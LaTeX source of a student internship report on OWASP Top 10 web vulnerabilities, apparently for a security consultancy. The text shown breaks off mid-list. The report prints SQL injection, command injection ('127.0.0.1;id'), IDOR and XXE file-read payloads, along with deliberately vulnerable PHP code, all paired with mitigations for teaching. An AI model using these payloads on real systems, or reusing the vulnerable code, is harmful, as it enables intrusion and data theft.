@@ -1,0 +1,1200 @@
+\documentclass[12pt,a4paper]{report}
+
+% --- PACKAGES ---
+\usepackage[utf8]{inputenc}
+\usepackage[T1]{fontenc}
+\usepackage[english]{babel}
+\usepackage[left=2.5cm,right=2.5cm,top=2.5cm,bottom=2.5cm,
+            headheight=15pt, footskip=1.25cm]{geometry} % Margins, footerskips adjusted, headheight for fancyhdr
+\usepackage{setspace}
+\usepackage{graphicx}
+\usepackage{caption}
+\usepackage{float}
+\usepackage[hidelinks, colorlinks=true, urlcolor=blue, linkcolor=black]{hyperref}
+\usepackage{fancyhdr}
+\usepackage{booktabs}
+\usepackage{tabularx}
+\usepackage{enumitem}
+\usepackage{titlesec} % For custom title formatting
+\usepackage{listings} % For code blocks
+\usepackage{xcolor}   % For code block colors
+\usepackage{textcomp} % For special characters like quotes
+\usepackage{amsmath}  % Provides environment for math mode, often helps with missing $
+
+\captionsetup[lstlisting]{labelformat=empty,labelsep=none}
+
+% --- CODE LISTING STYLES AND LANGUAGES ---
+% Define color for identifiers in http and json
+\definecolor{blueish}{rgb}{0.12,0.22,0.49} % Slightly darker blue
+
+% Define custom language for HTTP
+\lstdefinelanguage{http}{
+  keywords={GET,POST,PUT,DELETE,HEAD,OPTIONS,HTTP,Host,User-Agent,Accept,Connection,Content-Length,Content-Type,Authorization,Cookie,Set-Cookie,WWW-Authenticate,Content-Security-Policy,Strict-Transport-Security,Referrer-Policy},
+  keywordstyle=\color{blue}\bfseries,
+  ndkeywords={username,password,id,file,PHPSESSID,example.com,application/json,text/html,attacker.com,vulnerable-website.com,ROLENAME,ATTACKER_IP,PORT},
+  ndkeywordstyle=\color{blue!80!black}\ttfamily,
+  stringstyle=\color{red}\ttfamily,
+  commentstyle=\color{green!50!black}\ttfamily, % Changed to darker green
+  basicstyle=\ttfamily\footnotesize,
+  breaklines=true,
+  breakatwhitespace=true,
+  upquote=true,
+  literate={~}{\textasciitilde{}}{1} % Escape ~
+}
+
+% Define custom language for JSON
+\lstdefinelanguage{json}{
+    basicstyle=\normalfont\ttfamily\footnotesize,
+    numbers=left,
+    numberstyle=\tiny\color{gray},
+    stepnumber=1,
+    numbersep=8pt,
+    showstringspaces=false,
+    breaklines=true,
+    breakatwhitespace=false,
+    tabsize=2,
+    morestring=[b]{"},
+    stringstyle=\color{purple!80!black},
+    commentstyle=\color{green!50!black},
+    identifierstyle=\color{blue!80!black},
+    keywords={true, false, null, item_id, quantity, price},
+    keywordstyle=\color{magenta},
+    sensitive=false,
+}
+
+
+% Generic style for other listings (like php, sql, xml, bash)
+\definecolor{codegreen}{rgb}{0,0.6,0}
+\definecolor{codegray}{rgb}{0.5,0.5,0.5}
+\definecolor{codepurple}{rgb}{0.58,0,0.82}
+\definecolor{backcolour}{rgb}{0.95,0.95,0.93}
+
+\lstdefinestyle{genericstyle}{ % Base style
+    backgroundcolor=\color{backcolour},
+    commentstyle=\color{codegreen},
+    keywordstyle=\color{magenta},
+    numberstyle=\tiny\color{codegray},
+    stringstyle=\color{codepurple},
+    basicstyle=\ttfamily\footnotesize,
+    breakatwhitespace=false,
+    breaklines=true,
+    captionpos=b,
+    keepspaces=true,
+    numbers=left,
+    numbersep=5pt,
+    showspaces=false,
+    showstringspaces=false,
+    showtabs=false,
+    tabsize=2,
+    literate=
+      {á}{{\'a}}1 {é}{{\'e}}1 {í}{{\'i}}1 {ó}{{\'o}}1 {ú}{{\'u}}1
+      {Á}{{\'A}}1 {É}{{\'E}}1 {Í}{{\'I}}1 {Ó}{{\'O}}1 {Ú}{{\'U}}1
+      {à}{{\`a}}1 {è}{{\`e}}1 {ì}{{\`i}}1 {ò}{{\`o}}1 {ù}{{\`u}}1
+      {À}{{\`A}}1 {È}{{\'E}}1 {Ì}{{\`I}}1 {Ò}{{\`O}}1 {Ù}{{\`U}}1
+      {ä}{{\"a}}1 {ë}{{\"e}}1 {ï}{{\"i}}1 {ö}{{\"o}}1 {ü}{{\"u}}1
+      {Ä}{{\"A}}1 {Ë}{{\"E}}1 {Ï}{{\"I}}1 {Ö}{{\"O}}1 {Ü}{{\"U}}1
+      {â}{{\^a}}1 {ê}{{\^e}}1 {î}{{\^i}}1 {ô}{{\^o}}1 {û}{{\^u}}1
+      {Â}{{\^A}}1 {Ê}{{\^E}}1 {Î}{{\^I}}1 {Ô}{{\^O}}1 {Û}{{\^U}}1
+      {œ}{{\oe}}1 {Œ}{{\OE}}1 {æ}{{\ae}}1 {Æ}{{\AE}}1 {ß}{{\ss}}1
+      {ç}{{\c c}}1 {Ç}{{\c C}}1 {ø}{{\o}}1 {å}{{\r a}}1 {Å}{{\r A}}1
+      {€}{{\euro}}1 {£}{{\pounds}}1
+      {\$\_}{{\textasciicircum\textunderscore\textasciicircum}}1 % Ensure $_ for PHP variables is correctly handled in text contexts.
+      {\_}{{\textunderscore}}1 % For general underscores in comments/strings not already handled by $_
+}
+\lstset{style=genericstyle} % Set default style for all listings
+
+
+% --- FONT SIZE 12pt AND LINE SPACING 1.15 ---
+\linespread{1.15} % Global line spacing
+
+% --- CUSTOM PAGE HEADERS AND FOOTERS (EXCLUDING FIRST PAGE OF CHAPTER) ---
+% Custom pagestyle for normal chapter pages (not opening pages)
+\fancypagestyle{fancy}{
+  \fancyhf{} % clear all
+  % Only show "Chapter N" when chapter counter > 0
+  \fancyhead[L]{\bfseries\ifnum\value{chapter}>0 Chapter \thechapter\fi}
+  % Only show chapter title when chapter counter > 0
+  \fancyhead[R]{\bfseries\ifnum\value{chapter}>0 \MakeUppercase{\leftmark}\fi}
+  \fancyfoot[C]{\thepage}
+  \renewcommand{\headrulewidth}{0.4pt}
+  \renewcommand{\footrulewidth}{0pt}
+}
+
+% Special page style for chapter opening pages (plain style with centered page number)
+\fancypagestyle{chapterplain}{ 
+  \fancyhf{} % clear all headers and footers
+  \fancyfoot[C]{\thepage} % set page number in the center of the footer
+  \renewcommand{\headrulewidth}{0pt} % no header rule
+  \renewcommand{\footrulewidth}{0pt} % no footer rule
+}
+
+% --- Redefine how chapter and section marks behave for fancyhdr ---
+\makeatletter
+% \chaptermark: takes the *title text* from \chapter command. We ensure it's used for \leftmark.
+\renewcommand{\chaptermark}[1]{\markboth{#1}{#1}} % Store the chapter title itself in both \leftmark and \rightmark
+% \sectionmark: for sections, \leftmark should use chapter title, \rightmark should use section title.
+\renewcommand{\sectionmark}[1]{\markright{\thesection.\ #1}} % Stores "N.N. Section Title" in \rightmark
+\makeatother
+
+% Set default pagestyle for most document pages (defined above)
+\pagestyle{fancy}
+
+% Patch LaTeX's internal chapter mechanisms to use our custom 'chapterplain' style
+\makeatletter
+% Patch for numbered chapters (e.g. Chapter 1, Chapter 2) - to use chapterplain on its first page
+\patchcmd{\@makechapterhead}{\thispagestyle{plain}}{\thispagestyle{chapterplain}}{}{}
+% Patch for unnumbered chapters (e.g. General Introduction, Acknowledgements) - to use chapterplain on its first page
+\patchcmd{\@makeschapterhead}{\thispagestyle{plain}}{\thispagestyle{chapterplain}}{}{}
+\makeatother
+
+% --- TITLE FORMATTING (MATCHING GUIDELINES) ---
+% Chapter Level (Level 1 in guidelines): Garamond/Times 14, numéroté, 24/18 points espacement
+\titleformat{\chapter}[display]
+  {\normalfont\bfseries\centering\fontsize{14}{17}\selectfont\vspace{24pt}} % Font for "Chapter N" text part
+  {CHAPTER \thechapter} % "CHAPTER N" title prefix. Uses actual chapter number
+  {18pt} % Space between chapter prefix (CHAPTER N) and actual title
+  {} % Here will go the actual Chapter TITLE from \chapter{TITLE}
+\titlespacing*{\chapter}{0pt}{24pt}{18pt} % Left margin, space before title, space after title
+
+% Section Level (Level 2 in guidelines): Times 12, numéroté, bold, spacing
+\titleformat{\section}
+  {\normalfont\bfseries\fontsize{12}{14.5}\selectfont} % Bold, 12pt Garamond equivalent for title text
+  {\thesection} % The numbering like "1.1"
+  {1em} % Space between number and title text
+  {}
+\titlespacing*{\section}{0pt}{12pt}{6pt} % Space before, between, and after section title
+
+% Subsection Level (Level 3 in guidelines): Times 12, numéroté, bold, spacing
+\titleformat{\subsection}
+  {\normalfont\bfseries\fontsize{12}{14.5}\selectfont} % Bold, 12pt Garamond equivalent for title text
+  {\thesubsection} % The numbering like "1.1.1"
+  {1em} % Space between number and title text
+  {}
+\titlespacing*{\subsection}{0pt}{6pt}{3pt} % Space before, between, and after subsection title
+
+% Paragraph Indentation and Spacing (as per 1.2.3 Espacement)
+\setlength{\parindent}{0.75cm} % 0.75 cm indent for first line of paragraph
+\setlength{\parskip}{6pt} % 6 points minimum space between paragraphs. (Use flexible glue 6pt plus 2pt minus 1pt for more advanced formatting if strict adherence to 6-12 pt range is for a specific purpose like journal submission).
+
+% Ensure single line spacing for table contents, lists in body as default environment might override.
+% Standard LaTeX table/list environments often handle single spacing by default or need \setstretch{1.0} locally.
+
+% --- BIBLIOGRAPHY CONFIGURATION ---
+\usepackage[style=numeric, sorting=nty, backend=bibtex, giveninits=true, dashed=false]{biblatex} % Using biblatex for more flexible bibliography
+
+% Patch for URL display, to make it plain text as sometimes URL too wide for text. Or allow line break.
+\appto{\UrlBreaks}{\do\/\do\-\do\.\do\?}
+
+% Set default styling for lstlisting in captions and in text to be the default texttt monospaced style
+\lstset{
+    caption=\lstfont\scshape
+}
+
+\begin{filecontents}{myreferences.bib}
+@online{owasp_foundation,
+  author={OWASP Foundation},
+  title={The Open Web Application Security Project (OWASP) -- Global},
+  url={https://owasp.org/},
+  urldate={2023-10-26},
+  organization={OWASP Foundation}
+}
+@online{owasp_top10,
+  author={OWASP Foundation},
+  title={OWASP Top 10: 2021},
+  url={https://owasp.org/www-project-top-ten/},
+  urldate={2023-10-26},
+  organization={OWASP Foundation}
+}
+@online{portswigger_academy,
+  author={PortSwigger},
+  title={PortSwigger Web Security Academy -- Learn Web Security},
+  url={https://portswigger.net/web-security},
+  urldate={2023-10-26},
+  organization={PortSwigger Ltd.}
+}
+@online{hackthebox,
+  author={Hack The Box},
+  title={Hack The Box -- Penetration Testing Labs},
+  url={https://www.hackthebox.com/},
+  urldate={2023-10-26},
+  organization={Hack The Box Ltd.}
+}
+@online{sqlmap,
+  author={SQLMap Developers},
+  title={SQLMap: Automatic SQL injection and database takeover tool},
+  url={http://sqlmap.org/},
+  urldate={2023-10-26},
+  organization={SQLMap Project}
+}
+@online{owasp_adithyan_ak,
+  author={Adithyan AK},
+  title={OWASP Web Application Security Fundamentals (Presentation)},
+  url={https://owasp.org/www-chapter-coimbatore/assets/files/Web%20Application%20Security%20Adithyan%20AK.pdf},
+  urldate={2023-10-26},
+  organization={OWASP Coimbatore Chapter}
+}
+\end{filecontents}
+\addbibresource{myreferences.bib}
+
+% --- DOCUMENT START ---
+\begin{document}
+\pagenumbering{gobble} % suppress all page numbers
+% --- ACKNOWLEDGEMENTS ---
+% Ensure no header/footer on first Acknowledgements page (it uses plain as per requirement from chapter styles)
+\thispagestyle{plain} % Ensure first page of ack uses plain style for centering
+\cleardoublepage
+\phantomsection % Anchor for TOC
+\chapter*{Acknowledgements} % Use unnumbered chapter style (this one applies its own fancy)
+
+I would like to express my sincere gratitude to my academic institution, the Higher Institute of Technological Studies in Communications of Tunis, for providing the foundational knowledge that made this internship possible.
+
+I am immensely grateful to my supervisor at KEYSTONE, Mr. Aziz Nefzi. His expert guidance, consistent support, and deep knowledge of cybersecurity were instrumental throughout this project. His mentorship was invaluable in navigating the complexities of web application security and in shaping the direction of this report.
+
+My appreciation also extends to the entire KEYSTONE team. Their professionalism and welcoming atmosphere created an ideal learning environment. The opportunity to learn from such experienced professionals was a privilege.
+
+Finally, I would like to thank my university professors for their dedication and for equipping me with the technical and analytical skills necessary to undertake and succeed in this challenging internship.
+\cleardoublepage % End Acknowledgements
+
+% --- TABLE OF CONTENTS ---
+\cleardoublepage % Start TOC on a fresh page
+
+
+
+% Add TOC entries, overriding default page style to "fancy" for subsequent pages automatically
+% No header/footer on this specific page.
+\listoflistings % For listings like OWASP presentations
+\tableofcontents % This must be called AFTER listoflistings (or vice versa for desired order)
+
+\cleardoublepage
+
+% --- LIST OF FIGURES ---
+\phantomsection
+\listoffigures
+\cleardoublepage
+
+\cleardoublepage
+\listofabbreviations
+\chapter*{{List of Abbreviations}}
+\thispagestyle{chapterplain} % Apply chapterplain style to this unnumbered chapter's first page
+
+\begin{description}[style=multiline, labelwidth=2cm, leftmargin=!, labelsep=0.5em] % Adjust labelwidth as needed for longest abbreviation
+    \item[API] Application Programming Interface
+    \item[AWS] Amazon Web Services
+    \item[CI/CD] Continuous Integration/Continuous Delivery
+    \item[CLI] Command Line Interface
+    \item[CMS] Content Management Systems
+    \item[CSP] Content-Security-Policy
+    \item[CSRF] Cross-Site Request Forgery
+    \item[CVE] Common Vulnerabilities and Exposures
+    \item[DOM] Document Object Model
+    \item[DoS] Denial of Service
+    \item[DTD] Document Type Definition
+    \item[EC2] Elastic Compute Cloud
+    \item[GCP] Google Cloud Platform
+    \item[HSTS] HTTP Strict Transport Security
+    \item[HTTP] Hypertext Transfer Protocol
+    \item[HTTPS] Hypertext Transfer Protocol Secure
+    \item[IAM] Identity and Access Management
+    \item[IDOR] Insecure Direct Object Reference
+    \item[JNDI] Java Naming and Directory Interface
+    \item[JSON] JavaScript Object Notation
+    \item[LDAP] Lightweight Directory Access Protocol
+    \item[LFI] Local File Inclusion
+    \item[MAC] Message Authentication Code
+    \item[MD5] Message-Digest Algorithm 5
+    \item[MFA] Multi-Factor Authentication
+    \item[MitM] Man-in-the-Middle
+    \item[NoSQLi] NoSQL Injection
+    \item[OS] Operating System
+    \item[OWASP] Open Web Application Security Project
+    \item[PDO] PHP Data Objects
+    \item[PHP] Hypertext Preprocessor
+    \item[PII] Personal Identifiable Information
+    \item[RCE] Remote Code Execution
+    \item[RFC] Request for Comments
+    \item[S3] Simple Storage Service
+    \item[SCA] Software Composition Analysis
+    \item[SIEM] Security Information and Event Management
+    \item[SQL] Structured Query Language
+    \item[SQLi] SQL Injection
+    \item[SSRF] Server-Side Request Forgery
+    \item[TLS] Transport Layer Security
+    \item[URL] Uniform Resource Locator
+    \item[UUID] Universally Unique Identifier
+    \item[XML] Extensible Markup Language
+    \item[XSS] Cross-Site Scripting
+    \item[XXE] XML External Entity
+\end{description}
+\cleardoublepage
+
+\pagenumbering{arabic} % Start Arabic numbering
+% --- GENERAL INTRODUCTION (Corresponds to Introduction page 1 in pagination) ---
+\chapter*{General Introduction}
+\addcontentsline{toc}{chapter}{General Introduction} % Add General Introduction to TOC as a chapter-level entry
+
+In the digital era, web applications have become the primary interface through which organizations interact with their customers, partners, and employees. This ubiquity also makes them a prime target for malicious actors. A single vulnerability can lead to devastating consequences, including data breaches, financial loss, and reputational damage.
+
+This internship at KEYSTONE, a leading cybersecurity consulting firm, provided an invaluable opportunity to delve into the practical aspects of web application security assessment. The project was designed to simulate a real-world penetration test, focusing on the identification, exploitation, and mitigation of the most critical vulnerabilities.
+
+This report documents the technical findings and knowledge acquired. It is structured to follow a logical progression:
+\begin{itemize}
+    \item \textbf{Chapter 1} introduces the host organization, KEYSTONE, and outlines the project's context and objectives.
+    \item \textbf{Chapter 2} presents a systematic and detailed overview of the modern threat landscape, as defined by the OWASP Top 10, explaining the mechanics and payloads of each major vulnerability category.
+    \item \textbf{Chapter 3} demonstrates the hands-on exploitation of several critical vulnerabilities in a simulated lab environment, complete with mitigation strategies.
+\end{itemize}
+
+Through detailed explanations and practical examples, this report aims to serve as a comprehensive technical guide to understanding and combating common web application threats.
+\setcounter{page}{1} % Introduction (General Intro) starts on page 1
+\cleardoublepage % End General Introduction
+
+
+% --- CHAPTER 1: CONTEXT ---
+\chapter{Internship Context and Acquired Skills}
+\label{chap:context}
+
+\section{Introduction}
+This chapter presents the framework of the internship project. It begins by introducing the host organization, KEYSTONE, detailing its mission and structure. It then defines the specific objectives of the project and concludes with a reflection on the key benefits and skills acquired during this period of study in web application security.
+
+\section{Presentation of the Host Organization: KEYSTONE}
+KEYSTONE is an expert consulting firm specializing in information systems security, widely recognized as a pivotal actor in the cybersecurity landscape. Its core mission is to support organizations by offering a full spectrum of services dedicated to information security, encompassing both preventive measures and robust incident response.
+
+\begin{figure}[H]
+    \centering
+    \includegraphics[width=0.7\textwidth]{figures/keystone_logo.png}
+    \caption{KEYSTONE Logo.}
+    \label{fig:keystone-logo}
+\end{figure}
+
+The firm's structure is organized into several key departments, all working in concert to deliver comprehensive security solutions:
+\begin{itemize}
+    \item \textbf{General Management:} Responsible for the overall strategic direction and operational oversight of KEYSTONE.
+    \item \textbf{Technical Department:} Drives innovation and develops advanced cybersecurity solutions and methodologies.
+    \item \textbf{Operations Department:} Manages the delivery of security projects and ensures effective client implementation.
+    \item \textbf{SOC \& MSS Department:} Provides 24/7 Security Operations Center (SOC) and Managed Security Services (MSS), offering continuous monitoring and incident response.
+    \item \textbf{Administrative and Commercial Department:} Handles client relations, financial management, and business development to sustain growth and operational excellence.
+\end{itemize}
+
+\subsection{Internship Objectives}
+This internship was established to provide practical, in-depth experience in offensive security, a core competency of KEYSTONE. The focus was specifically directed towards web application security, recognizing its significance as one of the largest and most critical attack surfaces for modern organizations. The project's methodology involved a deep dive into the OWASP Top 10 vulnerabilities, leveraging simulated lab environments to develop and refine skills in identification, exploitation, and remediation techniques in a controlled setting.
+
+The primary objectives for this internship were precisely defined to guide the learning and practical application process:
+\begin{enumerate}
+    \item \textbf{Understand Major Attack Vectors:} To thoroughly study the mechanisms, impacts, and real-world exploitation techniques of key web attack vectors, including various forms of injection (SQLi, Command Injection, XXE), broken access control, and client-side vulnerabilities (XSS, CSRF).
+    \item \textbf{Analyze File and Logic Vulnerabilities:} To analyze vulnerabilities related to insecure file handling (Local File Inclusion, Arbitrary File Upload) and flaws in application logic (Server-Side Request Forgery).
+    \item \textbf{Formulate Robust Mitigation Measures:} For each identified and explored vulnerability, to research and detail effective mitigation strategies, including secure coding practices, architectural controls, and defensive configurations.
+\end{enumerate}
+
+\section{Benefits and Skills Acquired}
+This internship was a highly enriching and transformative experience, effectively bridging the gap between academic theory and real-world professional practice in cybersecurity. The learning outcomes encompassed a significant enhancement of both technical and methodological skills, crucial for a career in penetration testing and security consulting.
+
+\subsection{Technical Skills}
+\begin{itemize}
+    \item \textbf{In-depth Vulnerability Analysis:} Developed a deep, practical understanding of the OWASP Top 10 vulnerabilities, transcending theoretical definitions to grasp their root causes, exploitation pathways, and real-world impact. This included hands-on analysis of complex scenarios such as different types of injection flaws, access control bypasses, and server-side request forgery.
+    \item \textbf{Proficiency in Penetration Testing Tools:} Gained significant proficiency in utilizing essential web penetration testing tools. This includes Burp Suite (for intercepting, analyzing, and manipulating HTTP traffic), as well as various command-line utilities (like \texttt{curl} and \texttt{netcat}) and custom scripts tailored for specific attack scenarios.
+    \item \textbf{Payload Crafting and Customization:} Acquired the skill to design, craft, and customize malicious payloads effectively for diverse attack contexts, including sophisticated SQL injection strings, various Cross-Site Scripting (XSS) vectors, web shell scripts for remote code execution, and XML External Entity (XXE) payloads.
+    \item \textbf{Secure Coding Principles:} Through the process of analyzing numerous vulnerable code snippets and understanding their exploitation, a strong foundational knowledge of secure coding practices and architectural principles for web applications was developed, enabling the identification of insecure patterns and proposal of robust solutions.
+\end{itemize}
+
+\subsection{Methodological and Professional Skills}
+\begin{itemize}
+    \item \textbf{Systematic Penetration Testing Methodology:} Learned and applied a structured, systematic methodology to web application penetration testing, encompassing initial reconnaissance and enumeration, vulnerability identification, exploitation, and thorough post-exploitation analysis.
+    \item \textbf{Creative Problem-Solving:} Faced with security controls, filters, and various application logic challenges, I developed a creative and analytical mindset essential for devising effective bypass techniques and identifying nuanced vulnerabilities, mirroring the dynamic process of a real attacker.
+    \item \textbf{Technical Reporting and Documentation:} The extensive process of compiling this detailed report rigorously honed my ability to clearly, concisely, and comprehensively document complex technical findings, explain intricate vulnerabilities to diverse audiences, and formulate actionable, prioritized remediation strategies, which are critical competencies for any cybersecurity consultant.
+\end{itemize}
+\cleardoublepage
+
+
+% --- CHAPTER 2: EXPLORING WEB ATTACKS ---
+\chapter{Exploring Web Attacks: The OWASP Top 10}
+\label{chap:owasp}
+
+\section{Introduction}
+The Open Web Application Security Project (OWASP) Top 10 is a globally recognized standard that outlines the most critical security risks to web applications. This document, regularly updated through extensive community consensus, serves as a vital awareness document for developers, security professionals, and organizations alike. This chapter provides a detailed technical exploration of the OWASP Top 10 2021 list, focusing on the underlying mechanisms of each vulnerability, common exploitation payloads, and fundamental mitigation strategies, drawing on materials from OWASP's community resources.
+
+\section{A01:2021 – Broken Access Control}
+\subsection{Mechanism}
+Broken Access Control refers to flaws in enforcing policies that restrict what authenticated users (or even unauthenticated users) are allowed to do. These flaws allow attackers to bypass authorization checks to access resources, functions, or data they shouldn't, often leading to unauthorized information disclosure, data modification or destruction, privilege escalation, or performing business functions outside the user's intended limits. These vulnerabilities occur when server-side access control validation is either missing, incorrectly implemented, or relies on client-side controls that are easily circumvented.
+
+\subsection{Example Payload: Insecure Direct Object Reference (IDOR)}
+IDOR is a pervasive type of Broken Access Control. It occurs when an attacker can directly manipulate a reference to an internal object (such as a database key, file, or directory name) within a URL parameter or an API request to access or modify data that belongs to another user without proper authorization.
+Consider an application feature allowing a user (with User ID 101) to view their profile:
+\begin{lstlisting}[language=http, caption={HTTP Request for a User Profile.}, label={lst:http-user-profile}]
+GET /profile?user_id=101 HTTP/1.1
+Host: example.com
+Cookie: sessionid=ABCD123
+\end{lstlisting}
+An attacker might gain unauthorized access to an administrator's profile by simply changing the `user\_id` parameter to a guessed or enumerated ID, such as \texttt{100}:
+\begin{lstlisting}[language=http, caption={IDOR Payload for accessing another User's Profile.}, label={lst:idor-payload}]
+GET /profile?user_id=100 HTTP/1.1
+Host: example.com
+Cookie: sessionid=ABCD123
+\end{lstlisting}
+If the server-side logic fails to verify that the authenticated user (`sessionid=ABCD123`) is authorized to access \texttt{user\_id=100}, the attacker bypasses the intended access control.
+
+\subsection{Mitigation}
+\begin{itemize}
+    \item \textbf{Server-Side Enforcement:} Access control checks must always be enforced on the server-side, denying access by default unless explicitly granted. Never rely solely on client-side logic for authorization.
+    \item \textbf{Indirect Object References:} Avoid exposing internal object IDs (like database keys) directly in URLs, parameters, or API responses. Use indirect, randomly generated, or encrypted references that map to objects on the server-side, making them harder for attackers to guess.
+    \item \textbf{Centralized Access Control Matrix:} Implement a consistent and centralized mechanism for defining and enforcing access control rules across the entire application, preferably at the API or business logic layer, rather than ad-hoc checks throughout the codebase.
+\end{itemize}
+
+\section{A02:2021 – Cryptographic Failures}
+\subsection{Mechanism}
+This category encompasses a broad range of failures in protecting sensitive data through cryptography, both when data is at rest (stored in databases or filesystems) and in transit (communicated over networks). Common issues include using weak, outdated, or misconfigured cryptographic algorithms, insufficient key management, or storing sensitive information like passwords, credit card numbers, or Personal Identifiable Information (PII) in plaintext or with weak/improper hashes.
+
+\subsection{Example: Insecure Password Storage (MD5 Hashing)}
+A critical cryptographic failure is storing user passwords using insecure hashing algorithms. For instance, using MD5, a cryptographic hash function that is fast and often used without proper salting, makes password hashes highly vulnerable to rainbow table attacks and brute-forcing.
+\begin{lstlisting}[language=php, caption={Vulnerable: Storing a password with MD5.}, label={lst:md5-hash}]
+<?php
+// User input (plaintext password from a login/registration form)
+$password = $_POST['password'];
+
+// VULNERABLE: md5 is a cryptographic hash function that is fast and susceptible to attacks.
+$hashed_password = md5($password); 
+// Store $hashed_password in the database for later verification.
+?>
+\end{lstlisting}
+If an attacker compromises the database, they can easily use rainbow tables or brute-force attacks to recover these passwords.
+
+\subsection{Mitigation}
+\begin{itemize}
+    \item \textbf{Strong Hashing for Passwords:} For password storage, use modern, secure, and computationally intensive (slow) hashing algorithms like Argon2, bcrypt, or scrypt. These algorithms are designed to deter brute-force attacks and automatically handle salting (adding unique random data to each password hash to prevent rainbow table attacks).
+    \begin{lstlisting}[language=php, caption={Secure password storage using bcrypt in PHP.}, label={lst:bcrypt-hash}]
+<?php
+// User input (plaintext password)
+$password = $_POST['password'];
+// SECURE: password_hash uses bcrypt by default, is slow by design, and handles salting automatically.
+$hashed_password = password_hash($password, PASSWORD_DEFAULT);
+// Store $hashed_password safely in the database.
+?>
+\end{lstlisting}
+    \item \textbf{Encrypt Data in Transit:} Always use HTTPS (TLS 1.2 or higher with strong cipher suites) to encrypt all communication between the client and the server, especially for sensitive data. This prevents eavesdropping and Man-in-the-Middle (MitM) attacks. Implement HSTS (HTTP Strict Transport Security) to force browsers to only connect over HTTPS.
+    \item \textbf{Encrypt Sensitive Data at Rest:} Highly sensitive data (e.g., credit card numbers, PII) stored in databases or filesystems must be encrypted using strong, standard encryption algorithms like AES-256 with robust key management practices.
+\end{itemize}
+
+\section{A03:2021 – Injection}
+\subsection{Mechanism}
+Injection flaws occur when untrusted data (typically user-supplied input) is sent to an interpreter (such as a database, an operating system shell, or an XML parser) as part of a command or query. This allows an attacker to inject their own malicious code, causing the interpreter to execute unintended commands or manipulate data. This section focuses on SQL Injection, OS Command Injection, and XML External Entity (XXE) Injection.
+
+\subsubsection{SQL Injection (SQLi)}
+\textbf{Mechanism:} SQLi occurs when user-supplied input is directly concatenated into a SQL query string without proper sanitization or parameterization. This alters the intended logic of the SQL query.
+
+\textbf{Example Payload: Authentication Bypass}
+Consider a vulnerable login form where the backend constructs a query using string concatenation.
+\begin{lstlisting}[language=php, caption={Vulnerable PHP code for SQL Injection authentication bypass.}, label={lst:sqli-auth-bypass-vuln}]
+<?php
+$username = $_POST['username'];
+$password = $_POST['password']; // User input password
+$query = "SELECT * FROM users WHERE username = '$username' AND password = '$password'";
+// ... execute query ...
+?>
+\end{lstlisting}
+An attacker inputs `' OR '1'='1' --` as the username. The resulting query becomes:
+\begin{lstlisting}[language=sql, caption={Resulting SQL query after authentication bypass payload injection.}, label={lst:sql-bypass-injected}]
+SELECT * FROM users WHERE username = '' OR '1'='1' --' AND password = '...'
+\end{lstlisting}
+The \texttt{OR '1'='1'} condition evaluates to true, effectively bypassing the password check, and the \texttt{--} (or `/*` for SQL Server) comments out the rest of the query.
+
+\textbf{Example Payload: Data Exfiltration (UNION-based)}
+If the application displays query results, an attacker can use \texttt{UNION SELECT} to dump data from other tables in the database.
+\begin{lstlisting}[language=http, caption={UNION-based SQLi payload for data exfiltration via URL.}, label={lst:union-sqli-payload}]
+GET /products.php?id=-1 UNION SELECT version(), database(), user()-- HTTP/1.1
+Host: example.com
+\end{lstlisting}
+This query retrieves database version, current database name, and user from the system, combining it with the original query's output.
+
+\subsubsection{OS Command Injection}
+\textbf{Mechanism:} This occurs when an application executes a system command based on user input, and the input is not properly validated or sanitized. An attacker can inject arbitrary shell commands, causing the server to execute malicious operating system commands.
+
+\textbf{Example Payload: Ping Utility Remote Code Execution (RCE)}
+A web service might offer a "ping" functionality (e.g., in network diagnostics). A vulnerable implementation passes user input directly to a system shell command.
+\begin{lstlisting}[language=php, caption={Vulnerable PHP code for OS Command Injection.}, label={lst:command-inject-vuln}]
+<?php
+$target_ip = $_GET['ip'];
+$command = "ping -c 3 " . $target_ip; // Executes 'ping -c 3 [user_input]'
+shell_exec($command); // Direct execution of shell command with user input
+?>
+\end{lstlisting}
+An attacker can provide a target like \texttt{127.0.0.1;id}. The semicolon (\texttt{;}) acts as a command separator in Unix/Linux shells, allowing multiple commands to be executed sequentially.
+\begin{lstlisting}[language=http, caption={HTTP request with command injection payload.}, label={lst:command-injection-payload}]
+GET /ping?ip=127.0.0.1;id HTTP/1.1
+Host: example.com
+\end{lstlisting}
+The server will first execute \texttt{ping -c 3 127.0.0.1} and then, crucially, execute \texttt{id}, disclosing system user information.
+
+\begin{figure}[H]
+    \centering
+    \includegraphics[width=\textwidth]{figures/ping2rce.png}
+    \caption{Output of a Command Injection showing \texttt{id} command execution.}
+    \label{fig:ping-rce-output}
+\end{figure}
+
+
+\subsubsection{XML External Entity (XXE) Injection}
+\textbf{Mechanism:} XXE flaws occur in applications that parse XML input when support for XML external entities (defined within Document Type Definitions - DTDs, using \texttt{ENTITY} declarations) is enabled and improperly configured. An attacker can define external entities to include sensitive local files, interact with internal systems, or cause a Denial of Service (DoS).
+
+\textbf{Example Payload: Local File Read}
+An application accepts XML input, for instance, via a web service API or a contact form. The attacker sends a crafted XML payload:
+\begin{lstlisting}[language=xml, caption={XXE payload to read local file \texttt{/etc/passwd}.}, label={lst:xxe-local-file-read-payload}]
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
+<root>
+    <data>&xxe;</data> <!-- Injecting the entity here to trigger file read -->
+</root>
+\end{lstlisting}
+If the XML parser is vulnerable and supports external entities, it will resolve the \texttt{\&xxe;} entity by reading \texttt{/etc/passwd} and substitute its content into the XML response.
+
+\begin{figure}[H]
+    \centering
+    \includegraphics[width=\textwidth]{figures/xxe_file_disclosure.png}
+    \caption{XXE Local File Disclosure.}
+    \label{fig:xxe-file-read}
+\end{figure}
+
+\subsection{Mitigation (Injection)}
+\begin{itemize}
+    \item \textbf{Parameterized Queries (SQLi, NoSQLi):} For all database interactions, this is the gold standard. Use APIs that rigorously separate query logic from user-supplied data (e.g., \texttt{PDO} in PHP, \texttt{PreparedStatement} in Java).
+    \item \textbf{Strict Input Validation and Sanitization (Command Injection):} Implement a very strict allow-list for command arguments (e.g., regex \texttt{\textasciicircum{}[0-9.]{1,15}\$}\ for IP addresses). Avoid \texttt{shell\_exec()} or \texttt{system()} functions if possible; if necessary, use \texttt{escapeshellarg()} for single arguments or \texttt{escapeshellcmd()} for the entire command, but these are complex to get right.
